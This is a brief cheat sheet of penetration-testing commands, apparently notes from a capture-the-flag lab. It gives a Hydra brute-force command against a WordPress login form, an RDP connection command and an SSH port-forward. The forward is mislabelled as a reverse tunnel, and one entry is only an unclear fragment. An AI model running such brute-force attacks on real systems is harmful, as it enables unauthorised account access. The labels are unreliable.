# Manual Attack CheatSheet

## intruder sniper

-later la males

## hydra example

hydra -l Elliot -P wordl.txt 10.10.203.64 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username' -t 30

## spin up rdp

xfreerdp /u:username /v:host


## Reverse SSH Tunnel 
- ss -tulpn
- ssh -L 10000:localhost:10000 <username>@<ip>